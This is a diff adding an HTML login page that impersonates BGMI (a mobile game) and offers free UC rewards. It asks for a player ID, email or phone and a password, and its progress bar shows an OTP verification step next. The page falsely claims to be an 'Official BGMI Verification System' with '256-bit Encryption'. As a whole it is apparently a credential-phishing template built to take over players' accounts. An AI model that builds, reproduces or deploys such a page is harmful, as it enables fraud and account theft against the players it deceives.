@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>BGMI Login - Claim Rewards</title>
+    <link rel="stylesheet" href="/static/css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-header">
+            <img src="/static/images/bgmi-logo.png" alt="BGMI" class="logo-small">
+            <h2><i class="fas fa-sign-in-alt"></i> BGMI ACCOUNT VERIFICATION</h2>
+            <p>Login to verify ownership and receive UC</p>
+        </div>
+
+        <div class="progress-steps">
+            <div class="step done">1. Select Rewards ✓</div>
+            <div class="step active">2. Account Login</div>
+            <div class="step">3. OTP Verify</div>
+            <div class="step">4. Get UC</div>
+        </div>
+
+        <div class="login-box">
+            <form action="/login" method="POST">
+                <div class="input-group">
+                    <i class="fas fa-gamepad"></i>
+                    <input type="text" name="player_id" placeholder="BGMI Player ID / Email / Phone" required>
+                </div>
+                
+                <div class="input-group">
+                    <i class="fas fa-lock"></i>
+                    <input type="password" name="password" placeholder="Password" required>
+                    <span class="show-password" onclick="togglePassword(this)">
+                        <i class="fas fa-eye"></i>
+                    </span>
+                </div>
+
+                <button type="submit" class="login-btn">
+                    <i class="fas fa-unlock-alt"></i> VERIFY & CONTINUE
+                </button>
+            </form>
+
+            <div class="security-info">
+                <p><i class="fas fa-shield-alt"></i> Secure Connection | 256-bit Encryption</p>
+                <p><i class="fas fa-check-circle"></i> Official BGMI Verification System</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function togglePassword(button) {
+            const input = button.parentElement.querySelector('input');
+            const icon = button.querySelector('i');
+            
+            if (input.type === 'password') {
+                input.type = 'text';
+                icon.className = 'fas fa-eye-slash';
+            } else {
+                input.type = 'password';
+                icon.className = 'fas fa-eye';
+            }
+        }
+    </script>
+</body>
+</html>
